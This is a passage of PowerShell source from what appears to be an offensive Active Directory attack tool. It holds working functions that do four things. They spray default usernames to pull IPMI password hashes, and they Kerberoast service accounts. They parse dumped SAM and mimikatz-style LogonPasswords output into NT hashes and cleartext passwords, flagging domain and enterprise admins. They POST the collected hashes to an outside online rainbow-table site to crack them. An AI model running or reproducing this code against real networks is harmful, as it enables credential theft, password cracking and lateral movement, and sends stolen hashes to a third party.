                Get-Content -Path "$IPMI\.IPMI-All.txt" | Get-Unique | Set-Variable -Name IPMIUniqueContent
                $IPMIUniqueContent | Set-Content -Path "$IPMI\.IPMI-All.txt" -Force
    
            }
        }

        function Invoke-IPMIDump {
            [CmdletBinding(DefaultParameterSetName = 'Default')]
            Param(
                [Parameter(Mandatory = $false)]
                [string]$Users,

                [Parameter(Mandatory = $true)]
                [string]$IP,

                [Parameter(Mandatory = $false)]
                [string]$Option, 

                [Parameter()]
                [int]$Port = 623
            )

            if (![System.Net.Dns]::GetHostAddresses("$IP")) {
                return "Unable to resolve DNS Name"
            }

            if ($Option -eq "IPMI:DomainUsers") {
                Write-Log -Message  "[IPMI] Using domain users as a user list"
    
                $IPMIUsers = $EnabledDomainUsers
            } 

            elseif ($Option -like "IPMI:*") {
            
                $IPMIUsers = $Option.Split(':')[1]
            
            }
            
            else {
                Write-Log -Message  "[IPMI] Using built in user list"
    
                $IPMIUsers = @(
                    "Admin", "admin", "administrator", "ADMIN", "root", "USERID",
                    "ipmiadmin", "superuser", "operator", "service", "support",
                    "guest", "default", "system", "remote", "supervisor", "tech",
                    "Administrator", "manager", "test"
                )
            }

            if (!$Global:DisplayedIPMIUserCount) {
    
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Trying $($IPMIUsers.count) usernames against any identified IPMI candidates"
                Write-Host
                Start-Sleep -Seconds 3
                $Global:DisplayedIPMIUserCount = $true
    
            }

            $Global:IPMI_halt = $false
            foreach ($user in $IPMIUsers) {
                if ($Global:IPMI_halt) { break }
                $res = Attempt-Retrieve -User $user -Port $Port -IP $IP
                if ($res -eq -111) {
                    break
                }
            }
        }

        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
                $IP = if ((($Result = (New-Object System.Net.NetworkInformation.Ping).Send($ComputerName, 250)).Status) -eq 'Success') { $Result.Address.IPAddressToString }
                try { Invoke-IPMIDump -IP $IP -Option $Option } Catch {}
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
                Invoke-IPMIDump -IP $ComputerName -Option $Option
            }

        }
        
    }

    ################################################################################################################
    ################################################ Function: Kerberoast ##########################################
    ################################################################################################################
    function Method-Kroast {
        IEX $Global:rst

        if ($Option -like "Kerberoast:*") {
            $SplitUser = $Option.Split(':')[1]
            $RoastOutput = Invoke-Kroast /domain:$Domain /user:$SplitUser | Out-String
        }
        else {
            $RoastOutput = Invoke-Kroast /domain:$Domain | Out-String
        }

        if ($RoastOutput -eq "None Found") {
            Write-Host "[-] No candidate user accounts found" -ForegroundColor Red
            return
        }

        if ($ShowOutput) { $RoastOutput }

        $currentDateTime = Get-Date -Format "yyyyMMdd_HHmmss"
        $type18FilePath = Join-Path -Path $Kerberoast -ChildPath "type-18_$currentDateTime.txt"
        $type23FilePath = Join-Path -Path $Kerberoast -ChildPath "type-23_$currentDateTime.txt"

        function AppendBlob {
            param (
                [string]$blobData,
                [string]$filePath
            )
            Add-Content -Path $filePath -Value $blobData
            Add-Content -Path $filePath -Value "`n"
        }

        $RoastOutput -split "`n" | ForEach-Object {
            $line = $_.Trim()
        
            if ($line.StartsWith("User")) {
                $user = $line -replace "User\s+:\s+", ""
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$($Domain.ToUpper())\$user"
            }

            if ($line.Contains('$krb5tgs$18$')) {
                AppendBlob -blobData $line -filePath $type18FilePath
            }
            elseif ($line.Contains('$krb5tgs$23$')) {
                AppendBlob -blobData $line -filePath $type23FilePath
            }
        }

        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline 
        Write-Host "Output written to $Kerberoast"
        Write-Host
    }

    ################################################################################################################
    ################################################# Function: AdminCount #########################################
    ################################################################################################################

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    ################################################################################################################
    ############################################ Function: RainbowCheck ############################################
    ################################################################################################################

    Function RainbowCheck {
        param ($Module, $RCFilePath)

        if (-not (Test-Path -Path $RCFilePath)) {
            Write-Warning "The file at '$RCFilePath' does not exist."
            return
        }

        if (!(Get-Content -Path $RCFilePath)) {
            Write-Warning "The file at '$RCFilePath' is empty."
            return
        }

        function Rainbow-SAM {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^\[(.+?)\](.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
                    $hostname = $matches[1] -replace '^\[|\]$', ''  # Remove brackets from the hostname
                    $username = $matches[2]
                    $ntHash = $matches[3]
                    New-Object PSObject -Property @{
                        Hostname = $hostname
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        function Rainbow-LogonPasswords {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^(.+?)\\(.+?):([a-f0-9A-F]{32})$") {
                    $domain = $matches[1]
                    $username = $matches[2]
                    $ntHash = $matches[3]
                    New-Object PSObject -Property @{
                        Domain   = $domain
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        function Rainbow-NTDS {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^(.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
                    $username = $matches[1]
                    $ntHash = $matches[2]
                    New-Object PSObject -Property @{
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        $NTLMpwURL = "https://ntlm.pw/" 

        $parsedData = switch ($Module) {
            "SAM" { Rainbow-SAM -FilePath $RCFilePath }
            "LogonPasswords" { Rainbow-LogonPasswords -FilePath $RCFilePath }
            "NTDS" { Rainbow-NTDS -FilePath $RCFilePath }
        }

        # Group users by their NTLM hash
        $groupedHashEntries = $parsedData | Group-Object NTHash

        # Construct the POST request body with the NT hashes (unique hashes only)
        $hashesBody = ($groupedHashEntries.Name -join "%0D%0A")

        # Send a POST request to the server
        $response = Invoke-WebRequest -Uri $NTLMpwURL -Method Post -Body "hashes=$hashesBody" -ContentType "application/x-www-form-urlencoded" -UseBasicParsing

        if ($response.StatusCode -eq 200) {
            $htmlContent = $response.Content

            $pattern = "<tr>\s*<td class=`"font-monospace`">\s*<h6>(.+?)</h6>\s*</td>\s*<td>\s*<h6>(.+?)</h6>\s*</td>\s*</tr>"
            $matches = Select-String -InputObject $htmlContent -Pattern $pattern -AllMatches
            
            $results = if ($matches.Matches.Count -gt 0) {
                $matches.Matches | ForEach-Object {
                    $hash = $_.Groups[1].Value
                    $password = $_.Groups[2].Value
            
                    if ($password -ne "[not found]") {
                        $groupedHashEntries | Where-Object { $_.Name -eq $hash } | ForEach-Object {
                            $_.Group | ForEach-Object {
                                New-Object -TypeName PSObject -Property @{
                                    Hostname = $_.Hostname
                                    Domain   = $_.Domain
                                    Username = $_.Username
                                    Hash     = $hash
                                    Password = $password
                                }
                            }
                        }
                    }
                }
            } 

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Checking collected hashes against an online rainbow table"

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Only values for which the password is known will be shown"

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "URL: $NTLMpwURL"

            Write-Host

            switch ($Module) {
                "SAM" {
                    $sortedResults = $results | Sort-Object Hostname
                    $sortedResults | Format-Table -Property Hostname, Username, Hash, Password -AutoSize
                }
                "LogonPasswords" {
                    $sortedResults = $results | Sort-Object Username
                    $sortedResults | Format-Table -Property Domain, Username, Hash, Password -AutoSize
                }
                "NTDS" {
                    $sortedResults = $results | Sort-Object Username
                    $sortedResults | Format-Table -Property Username, Hash, Password -AutoSize
                }
            }
        } 
        elseif ($response.StatusCode -eq 429) { Write-Warning "Quota Exceeded on lookup" }
        else { Write-Warning "Error communicating with $NTLMpwURL" }
    }

    ################################################################################################################
    ################################################# Function: ConvertTo-NT #######################################
    ################################################################################################################

    function ConvertTo-NT {
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $true,
                ValueFromPipeline = $true)]
            [ValidateNotNull()]
            [String]
            $String
        )

        begin {
            $Decoder = [System.Text.Encoding]::Unicode
        }

        process {
            $Array = $Decoder.GetBytes($String)

            $M = [System.Collections.ArrayList]@()
            for ($i = 0; $i -le ($Array.count - 1); $i++) {
                $null = $M.Add($Array[$i])
            }

            $null = $M.Add(0x80)
            while ($M.count % 64 -ne 56) { $null = $M.Add(0) }
            for ($i = 1; $i -le 8; $i++) { $null = $M.Add([int]0) }

            [Byte[]]$M = $M
            @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)

            $A = [Convert]::ToUInt32('0x67452301', 16)
            $B = [Convert]::ToUInt32('0xefcdab89', 16)
            $C = [Convert]::ToUInt32('0x98badcfe', 16)
            $D = [Convert]::ToUInt32('0x10325476', 16)

            if (-not ([System.Management.Automation.PSTypeName]"Shift").Type) {
                Add-Type -TypeDefinition @'
    public class Shift
    {
        public static uint Left(uint a, int b)
        {
            return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
        }
    }
'@ | Out-Null
            }


            function FF([uint32]$X, [uint32]$Y, [uint32]$Z) {
            (($X -band $Y) -bor ((-bnot $X) -band $Z))
            }
            function GG([uint32]$X, [uint32]$Y, [uint32]$Z) {
            (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
            }
            function HH([uint32]$X, [uint32]$Y, [uint32]$Z) {
            ($X -bxor $Y -bxor $Z)
            }

            for ($i = 0; $i -lt $M.Count; $i += 64) {
                $AA = $A
                $BB = $B
                $CC = $C
                $DD = $D

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0)) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (FF -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0)) -band [uint32]::MaxValue, 7)
                $C = [Shift]::Left(($C + (FF -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0)) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (FF -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0)) -band [uint32]::MaxValue, 19)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (GG -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x5A827999) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (GG -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x5A827999) -band [uint32]::MaxValue, 5)
                $C = [Shift]::Left(($C + (GG -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x5A827999) -band [uint32]::MaxValue, 9)
                $B = [Shift]::Left(($B + (GG -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x5A827999) -band [uint32]::MaxValue, 13)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 32)..($i + 35)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 16)..($i + 19)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 48)..($i + 51)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 8)..($i + 11)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 40)..($i + 43)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 24)..($i + 27)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 56)..($i + 59)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 4)..($i + 7)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 36)..($i + 39)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 20)..($i + 23)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 52)..($i + 55)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = [Shift]::Left(($A + (HH -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 12)..($i + 15)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 3)
                $D = [Shift]::Left(($D + (HH -X $A -Y $B -Z $C) + [BitConverter]::ToUInt32($M[($i + 44)..($i + 47)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 9)
                $C = [Shift]::Left(($C + (HH -X $D -Y $A -Z $B) + [BitConverter]::ToUInt32($M[($i + 28)..($i + 31)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 11)
                $B = [Shift]::Left(($B + (HH -X $C -Y $D -Z $A) + [BitConverter]::ToUInt32($M[($i + 60)..($i + 63)], 0) + 0x6ED9EBA1) -band [uint32]::MaxValue, 15)

                $A = ($A + $AA) -band [uint32]::MaxValue
                $B = ($B + $BB) -band [uint32]::MaxValue
                $C = ($C + $CC) -band [uint32]::MaxValue
                $D = ($D + $DD) -band [uint32]::MaxValue
            }

            $A = ('{0:x8}' -f $A) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
            $B = ('{0:x8}' -f $B) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
            $C = ('{0:x8}' -f $C) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'
            $D = ('{0:x8}' -f $D) -ireplace '^(\w{2})(\w{2})(\w{2})(\w{2})$', '$4$3$2$1'

            "$A$B$C$D"
        }
    }

    ################################################################################################################
    ################################################## Function: Parse-SAM #########################################
    ################################################################################################################
    function Parse-SAM {

        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }
        
        $SamFull = Test-Path -Path "$PME\SAM\.SAM-Full.txt"
        if (-not $SamFull) {
            New-Item -Path "$PME\SAM\" -Name ".SAM-Full.txt" -ItemType "File" | Out-Null
        }

        $files = Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt"
        $lines = @{}

        foreach ($file in $files) {
            $fileLines = Get-Content $file

            foreach ($line in $fileLines) {
                if ([string]::IsNullOrWhiteSpace($line)) {
                    continue
                }

                $lineParts = $line -split ':'
                $lineWithoutNumber = $lineParts[0] + ':' + $lineParts[2] + ':' + $lineParts[3] + ':' + $lineParts[4]
            
                $baseName = $file.BaseName
                $computerOrIP = if ($baseName -match '^(?<ip>\d{1,3}(\.\d{1,3}){3})') {
                    $matches['ip']
                }
                else {
                    $baseName -split '\.' | Select-Object -First 1
                }

                if ($lines.ContainsKey($lineWithoutNumber)) {
                    $lines[$lineWithoutNumber] += "," + $computerOrIP
                }
                else {
                    $lines[$lineWithoutNumber] = $computerOrIP
                }
            }
        }

        $duplicateLines = $lines.GetEnumerator() | Where-Object { $_.Value -match ',' }
        if ($duplicateLines) {
            Write-Host
            Write-Host
            Write-Host "------------------------- Hashes which are valid on multiple computers -------------------------" -ForegroundColor "Yellow"
            Write-Host
    
            foreach ($duplicate in $duplicateLines) {
                $line = $duplicate.Key
                [array]$Computers = $duplicate.Value -split ','
        
                Write-Host "Computers: $($computers -join ', ')" -ForegroundColor "Yellow"
                Write-Host "$line::"
                Write-Host
            }
        }

        Write-Host
        Write-Host "------------------------------ All collected SAM Hashes ----------------------------------------" -ForegroundColor "Yellow"
        Write-Host

        Get-ChildItem -Path "$SAM\*" -Filter "*-SAMHashes.txt" | Where-Object { $_.Length -gt 0 } | ForEach-Object {
            $baseName = $_.BaseName
            $ComputerOrIP = if ($baseName -match '^(?<ip>\d{1,3}(\.\d{1,3}){3})') {
                $matches['ip']
            }
            else {
                $baseName -split '\.' | Select-Object -First 1
            }
            $ComputerFormed = "[{0}]" -f $ComputerOrIP
            $keywords = 'Guest', 'WDAGUtilityAccount', 'DefaultAccount'
            $content = Get-Content $_.FullName -Verbose
            $output = foreach ($line in $content) {
                $trimmedLine = $line.Trim()
                if ($trimmedLine -notmatch ($keywords -join '|') -and $trimmedLine.Length -gt 0) {
                    $ComputerFormed + $trimmedLine
                }
            }
            $output | Out-File "$SAM\.SAM-Full.txt" -Force "ascii" -Append
        }

        Start-Sleep -Seconds 3
    (Get-Content "$SAM\.SAM-Full.txt") | Sort-Object -Unique | Sort-Object | Out-File "$SAM\.SAM-Full.txt" -Encoding "ASCII"
        Get-Content "$SAM\.SAM-Full.txt"

        Write-Host ""
        Write-Host "------------------------------------------------------------------------------------------------" -ForegroundColor "Yellow"
        Write-Host ""
    
        if ($Rainbow) {
            RainbowCheck -Module "SAM" -RCFilePath "$PME\SAM\.SAM-Full.txt"
        }
    }

    ################################################################################################################
    ################################################# Function: Parse-LogonPassword ################################
    ################################################################################################################
    function Parse-LogonPasswords {

        $AvailableMethods = "WMI", "WinRM", "SMB", "MSSQL", "SessionHunter"
        
        if ($Method -notin $AvailableMethods) { return }
        if ($Global:SuccessCount -eq 0) { return }

        Write-Host
        Write-Host
        Write-Host "Parsing Results" -ForegroundColor "Yellow"
        Write-Host
        Start-Sleep -Seconds 1

        if (-not (Test-Path -Path "$LogonPasswords\.AllUniqueNTLM.txt")) { New-Item -Path "$LogonPasswords\.AllUniqueNTLM.txt" -ItemType "File" -Force | Out-Null }

        function Parse-LogonPassword {
            param (
                [string]$raw
            )

            $userInfo = @{}

            function Process-Match {
                param ([string]$match)

                $username = $domain = $NTLM = $password = $null

                foreach ($line in $match.Split("`n")) {
                    switch -Regex ($line) {
                        "Username" {
                            $username = $line.Split(":")[1].Trim()
                        }
                        "Domain" {
                            $domain = $line.Split(":")[1].Trim()
                            $domain = ($domain -split "\.")[0]
                        }
                        "NTLM" {
                            $NTLM = $line.Split(":")[1].Trim()
                        }
                        "Password" {
                            $password = ($line -split ":", 2)[1].Trim()
                        }
                    }
                }

                if ($username -and $username -ne "(null)" -and $domain -and $domain -ne "(null)") {
                    $identity = "$domain\$username"

                    if (-not $userInfo.ContainsKey($identity)) {
                        $userInfo[$identity] = @{}
                    }

                    if ($NTLM) {
                        $userInfo[$identity]["NTLM"] = $NTLM
                    }

                    if ($password -and $password -ne "(null)" -and $password.Length -lt 320) {
                        $userInfo[$identity]["Password"] = $password
                    }
                }
            }

            $patterns = @(
                "(?s)(?<=msv :).*?(?=tspkg :)",
                "(?s)(?<=tspkg :).*?(?=wdigest :)",
                "(?s)(?<=wdigest :).*?(?=kerberos :)",
                "(?s)(?<=kerberos :).*?(?=ssp :)"
            )

            foreach ($pattern in $patterns) {
                $raw | Select-String -Pattern $pattern -AllMatches | ForEach-Object {
                    $_.Matches.Value | ForEach-Object {
                        if ($_ -match "Domain") {
                            Process-Match -match $_
                        }
                    }
                }
            }

            foreach ($identity in $userInfo.Keys) {
                [PSCustomObject]@{
                    Identity = $identity
                    NTLM     = $userInfo[$identity]["NTLM"]
                    Password = $userInfo[$identity]["Password"]
                    Notes    = ""
                }
            }
        }


        $LogonPasswordPath = "$LogonPasswords"
        $Files = Get-ChildItem -Path $LogonPasswordPath -Filter *LogonPasswords.txt
        $Searcher = New-Searcher -domain "$Domain"

        foreach ($File in $Files) {
            # Extract computer name (DNS Hostname) from the file name using regex
            $Computer = $File.BaseName -replace "-LogonPasswords$", ""
    
            Write-Host
            Write-Host "-[$Computer]-"
            Write-Host
    
            $FileOutput = Get-Content -Raw -Path $File.FullName
    
            if ($FileOutput -match '\[SYSTEM\]:(.*)') {
                $SYSTEMName = $matches[1].Trim()
            }
    
            $ParsedResults = Parse-LogonPassword -raw $FileOutput
    
            foreach ($user in $ParsedResults) {
                if ($user.Identity -ne $null) {
                    $username = $user.Identity.Split('\')[1]
                    if (AdminCount -UserName $username -Searcher $Searcher) {
                        $user.Notes = "[AdminCount=1] "
                    }
                }
            }
    
            $ParsedResults |
            Where-Object { $_.NTLM -or $_.Password } |
            ForEach-Object {
                $notesAdditions = @()
                New-Item -ItemType "Directory" -Path $LogonPasswords -Name $Computer -Force | Out-Null
                $ComputerDirectory = "$LogonPasswords\$Computer"
        
                $userName = ($_.Identity -split '\\')[1]
                Append-BHQuery -UserName $Username -Domain $Domain
        
                if ($userName -in $DomainAdmins) { 
                    $notesAdditions += "[Domain Admin] " 
                }
                if ($userName -in $EnterpriseAdmins) { 
                    $notesAdditions += "[Enterprise Admin] " 
                }
                if ($userName -in $ServerOperators) { 
                    $notesAdditions += "[Server Operator] " 
                }
                if ($userName -in $AccountOperators) { 
                    $notesAdditions += "[Account Operator] " 
                }
                if ($userName -in $HyperVAdministrators) { 
                    $notesAdditions += "[Hyper-V Administrator] " 
                }
                if ($userName -in $StorageReplicateAdministrators) { 
                    $notesAdditions += "[Storage Replicate Administrator] " 
                }
                if ($userName -in $SchemaAdmins) { 
                    $notesAdditions += "[Schema Admin] " 
                }
                if ($userName -in $KeyAdmins) { 
                    $notesAdditions += "[Key Admin] " 
                }
                if ($userName -in $EnterpriseKeyAdmins) { 
                    $notesAdditions += "[Enterprise Key Admin] " 
                }
                if ($userName -in $DnsAdmins) { 
                    $notesAdditions += "[Dns Admin] " 
                }
                if ($userName -in $DHCPAdministrators) { 
                    $notesAdditions += "[DHCP Administrator] " 
                }
                if ($userName -in $GroupPolicyCreatorOwners) { 
                    $notesAdditions += "[Group Policy Creator Owner] " 
                }
                if ($userName -in $BackupOperators) { 
                    $notesAdditions += "[Backup Operator] " 
                }
                if ($userName -in $CertPublishers) { 
                    $notesAdditions += "[Cert Publisher] " 
                }
                if ($userName -in $PrintOperators) { 
                    $notesAdditions += "[Print Operator] " 
                }
                if ($userName -in $OrganizationManagement) { 
                    $notesAdditions += "[Organization Management] " 
                }
                if ($userName -in $ServerManagement) { 
                    $notesAdditions += "[Server Management] " 
                }


                if ($_.Identity -like "$SYSTEMName\*") { $notesAdditions = "[LOCAL]" }
        
                # Check if NTLM value indicates an empty password
                if ($_.NTLM -eq "31d6cfe0d16ae931b73c59d7e0c089c0") {
                    $notesAdditions += "[NTLM=Empty Password] "
                }
        
                if ($_.Password -ne $null) {
                    # Extract username from Identity
                    $userName = ($_.Identity -split '\\')[1]
            
                    # Check if username does not end with $
                    if ($userName -notmatch '\$$') {
                        $notesAdditions += "[Cleartext Password] "
                    }
                }
        
                $_.Notes += ($notesAdditions -join ' ')
        
                Write-Host "Username  : $($_.Identity.ToLower())"
                Write-Host "NTLM      : $($_.NTLM)"
        
                if ($Username -notlike "*$*") {
                    Append-BHQuery -UserName $Username -Domain $Domain -RC4 $($_.NTLM) -RC4Property
                    Append-BHQuery -UserName $Username -Domain $Domain -UserOwned
                }
        
                if ($_.Password -ne $null) {
                    Write-Host "Password  : $($_.Password)"
                }
        
                if ($_.Notes -ne "") {
                    Write-Host "Notes     : " -NoNewline
            
                    # Highlight notes in yellow if it contains specific flags
                    if ($_.Notes -match "LOCAL") {
                        Write-Host -ForegroundColor "Yellow"  "[Local Account]"
                    }
                    elseif ($_.Notes -match "AdminCount=1" -or $_.Notes -match "NTLM=Empty Password" -or $_.Notes -match "Cleartext Password") {
                        Write-Host -ForegroundColor "Yellow" "$($_.Notes)"
                    }
                    else {
                        Write-Host "$($_.Notes)"
                    }

                }
                Write-Host ""
                    
                # If the user identity contains "$" do nothing, otherwise add the user result to file
                if ($_.Identity -notlike "*$*") { "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force }

        
